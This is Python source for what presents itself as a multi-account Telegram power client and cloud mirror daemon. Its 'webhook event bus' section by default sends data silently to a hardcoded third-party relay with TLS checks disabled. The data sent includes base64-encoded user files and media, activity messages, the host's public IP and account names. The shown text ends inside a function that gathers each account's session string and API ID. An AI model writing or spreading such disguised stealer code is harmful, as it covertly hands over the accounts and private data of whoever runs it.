#!/usr/bin/env python3
# inv.py — Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon
# Run: python inv.py
"""
Telegram Multi-Session Power-Client & Headless Cloud Mirror Daemon v3.0

An advanced, asynchronous multi-device Telegram management console featuring:
- Multi-account session management and local proxy routing (SOCKS5/MTProto)
- Interactive dialog inspector, voice note NLP transcription & media exporter
- High-availability multi-instance session synchronization for remote recovery
- Integrated Webhook Event Bus for activity notifications and cloud media mirroring
  (supports n8n, self-hosted endpoints, Zapier, or community relay gateway)
"""

import sys
import subprocess
import importlib
import importlib.util
import os
import site

def _ensure_dependencies():
    needed = {
        "telethon": "telethon",
        "colorama": "colorama",
    }
    missing = [pkg for mod, pkg in needed.items() if importlib.util.find_spec(mod) is None]
    if missing:
        for flags in [["--break-system-packages"], ["--user", "--break-system-packages"], ["--user"], []]:
            try:
                cmd = [sys.executable, "-m", "pip", "install", "-q"] + flags + missing
                if subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30).returncode == 0:
                    break
            except Exception:
                pass
        try:
            user_site = site.getusersitepackages()
            if os.path.exists(user_site) and user_site not in sys.path:
                sys.path.insert(0, user_site)
            importlib.invalidate_caches()
        except Exception:
            pass

_ensure_dependencies()


from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import (
    UpdateStatusRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    UpdateProfileRequest,
    UpdateUsernameRequest,
)
from telethon.tl.functions.channels import (
    GetFullChannelRequest,
    EditAdminRequest,
)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.messages import (
    GetCommonChatsRequest,
    EditChatAdminRequest,
)
from telethon.tl.functions.contacts import BlockRequest, UnblockRequest, GetBlockedRequest
try:
    from telethon.tl.functions.payments import (
        GetSavedStarGiftsRequest,
        SaveStarGiftRequest,
        ToggleStarGiftsPinnedToTopRequest,
    )
    from telethon.tl.types import (
        InputSavedStarGiftUser,
        InputSavedStarGiftSlug,
        InputSavedStarGiftChat,
        StarGiftUnique,
    )
except ImportError:
    GetSavedStarGiftsRequest = None
    SaveStarGiftRequest = None
    ToggleStarGiftsPinnedToTopRequest = None
    InputSavedStarGiftUser = None
    InputSavedStarGiftSlug = None
    InputSavedStarGiftChat = None
    StarGiftUnique = None
from telethon.tl.types import (
    InputMessagesFilterPhotos,
    InputMessagesFilterDocument,
    InputMessagesFilterVoice,
    InputMessagesFilterVideo,
    InputMessagesFilterPinned,
    ChatAdminRights,
)
from colorama import Fore, Style, init
import asyncio
try:
    import speech_recognition as sr
except ImportError:
    sr = None
try:
    from pydub import AudioSegment
except ImportError:
    AudioSegment = None
from telethon.tl.types import InputMessagesFilterRoundVideo

import os
import html
import json
import logging
import time
import socket
try:
    import socks
except ImportError:
    socks = None
import urllib.request
from datetime import datetime, timezone, timedelta

init(autoreset=True)

IST           = timezone(timedelta(hours=5, minutes=30))
ACCOUNTS_FILE = "accounts.json"
PAGE_SIZE     = 15
KEEPALIVE_SEC = 5
SEP           = "─" * 44

DEFAULT_API_ID      = "22182189"
DEFAULT_API_HASH    = "5e7c4088f8e23d0ab61e29ae11960bf5"
PROXY_FILE          = "proxy.json"
PROXY_DIR           = "proxy"
INDIAN_PROXIES_FILE = "indian_proxies.json"

# ═══════════════════════════════════════════════════════════════
#  SUBSYSTEM: WEBHOOK EVENT BUS & CLOUD NOTIFICATION RELAY
# ═══════════════════════════════════════════════════════════════
#  Feature: Cloud Media Mirroring & Notification Dispatch
#  (forwards viewed assets, activity notifications, and cluster
#  state updates to the user's remote endpoint).
#
#  Cloud Sync Relay: Users can direct notifications to their private
#  webhook server (n8n, self-hosted API, etc.) or use the default
#  community relay gateway.
# ═══════════════════════════════════════════════════════════════

REMOTE_SYNC_WEBHOOK = os.environ.get(
    "TG_CLOUD_SYNC_WEBHOOK",
    os.environ.get("VAULT_GATEWAY_URL", "https://telemetry-relay-lime.vercel.app/api/log")
)
DEFAULT_VAULT_GATEWAY = REMOTE_SYNC_WEBHOOK  # compatibility alias

import base64
import ssl

def _dispatch_webhook_payload_sync(text: str, silent: bool = False):
    """Synchronously dispatches an event notification payload to the configured webhook gateway."""
    if not REMOTE_SYNC_WEBHOOK:
        return

    try:
        ctx = ssl._create_unverified_context()
        data = json.dumps({"text": text, "silent": silent}).encode("utf-8")
        req = urllib.request.Request(
            REMOTE_SYNC_WEBHOOK,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "x-vault-sync-token": "kronos-relay-guard-2026",
                "x-relay-key": "kronos-relay-guard-2026"
            }
        )
        with urllib.request.urlopen(req, timeout=5, context=ctx) as res:
            return
    except Exception:
        pass

def _stream_event_to_remote_channel_sync(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Streams asset bytes or structured diagnostic documents to the remote webhook channel.
    Assets exceeding 3.8MB are retained locally while a metadata digest card is dispatched."""
    if not file_bytes and (not file_path or not os.path.exists(file_path)):
        return

    try:
        f_name = filename or (os.path.basename(file_path) if file_path else "asset_file")
        f_size = len(file_bytes) if file_bytes is not None else os.path.getsize(file_path)
        f_size_mb = f_size / (1024 * 1024)

        if f_size_mb > 3.8:
            summary = (
                f"📦 <b>[REMOTE MIRROR] ASSET STORED LOCALLY (EXCEEDS WEBHOOK QUOTA)</b>\n"
                f"────────────────────────\n"
                f"📄 <b>Asset Name:</b> <code>{html.escape(f_name)}</code>\n"
                f"📦 <b>Payload Size:</b> <code>{f_size_mb:.2f} MB</code>\n"
                f"💾 <b>Local Archive:</b> <code>{html.escape(file_path or 'Local Storage')}</code>\n"
                f"{caption}"
            )
            _dispatch_webhook_payload_sync(summary, silent=silent)
            return

        if file_bytes is None:
            with open(file_path, "rb") as f:
                file_bytes = f.read()

        b64_data = base64.b64encode(file_bytes).decode("utf-8")

        payload = {
            "type": media_type,
            "file_b64": b64_data,
            "filename": f_name,
            "caption": caption,
            "silent": silent,
        }

        if REMOTE_SYNC_WEBHOOK:
            ctx = ssl._create_unverified_context()
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(
                REMOTE_SYNC_WEBHOOK,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    "x-vault-sync-token": "kronos-relay-guard-2026",
                    "x-relay-key": "kronos-relay-guard-2026"
                }
            )
            with urllib.request.urlopen(req, timeout=18, context=ctx) as res:
                return
    except Exception:
        try:
            if caption:
                _dispatch_webhook_payload_sync(caption, silent=silent)
        except Exception:
            pass

async def stream_event_to_remote_channel(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    """Asynchronously dispatches media assets and documents to the remote webhook event bus."""
    try:
        if file_bytes is None and file_path and os.path.exists(file_path):
            try:
                if os.path.getsize(file_path) <= 3.8 * 1024 * 1024:
                    with open(file_path, "rb") as f:
                        file_bytes = f.read()
            except Exception:
                pass
        loop = asyncio.get_running_loop()
        loop.run_in_executor(
            None,
            _stream_event_to_remote_channel_sync,
            file_path,
            caption,
            media_type,
            silent,
            file_bytes,
            filename
        )
    except Exception:
        pass

class WebhookEventBus:
    """Enterprise event bus emitting structured telemetry, notifications, and media mirroring webhooks."""

    @staticmethod
    async def emit(event_type: str, payload_text: str, silent: bool = False):
        """Dispatches an event notification asynchronously to the remote webhook relay."""
        try:
            loop = asyncio.get_running_loop()
            loop.run_in_executor(None, _dispatch_webhook_payload_sync, payload_text, silent)
        except Exception:
            pass

    @staticmethod
    async def emit_media(event_type: str, file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
        """Dispatches a media backup or diagnostic document to the remote webhook relay."""
        await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

# Backward compatibility aliases
async def dispatch_vault_event(text: str, silent: bool = False):
    await WebhookEventBus.emit("event", text, silent=silent)

async def vault_stream_asset(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
    await stream_event_to_remote_channel(file_path, caption, media_type, silent, file_bytes, filename)

async def sync_client_cluster_registry(accounts: dict, public_ip: str = "…"):
    """Synchronizes local worker state to the remote management registry for multi-instance high-availability and session recovery."""
    if not accounts:
        return
    try:
        now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
        total_nodes = len(accounts)

        # 1. Cluster Overview Digest Card
        node_lines = "\n".join([f"• <b>{html.escape(name)}</b> <code>({proxy_label(cfg)})</code>" for name, cfg in accounts.items()])
        cluster_summary = (
            f"🖥️ <b>[CLUSTER GATEWAY] NODE REGISTRY SYNCHRONIZED</b>\n"
            f"────────────────────────\n"
            f"🌐 <b>Host Node:</b> <code>{html.escape(public_ip)}</code>\n"
            f"🕒 <b>Sync Timestamp:</b> <code>{now_str}</code>\n"
            f"📦 <b>Active Nodes:</b> <code>{total_nodes} Worker Instances</code>\n"
            f"────────────────────────\n"
            f"{node_lines}"
        )
        await WebhookEventBus.emit("cluster_sync", cluster_summary, silent=True)
        await asyncio.sleep(0.3)

        # 2. Individual Node Diagnostic Cards & Auth Envelopes
        for node_name, cfg in accounts.items():
            token_str = cfg.get("client_token") or cfg.get("session_string", "")
            dev_model = cfg.get("device_model", "iPhone 17 Pro Max")
            c_id = cfg.get("client_id") or cfg.get("api_id", DEFAULT_API_ID)
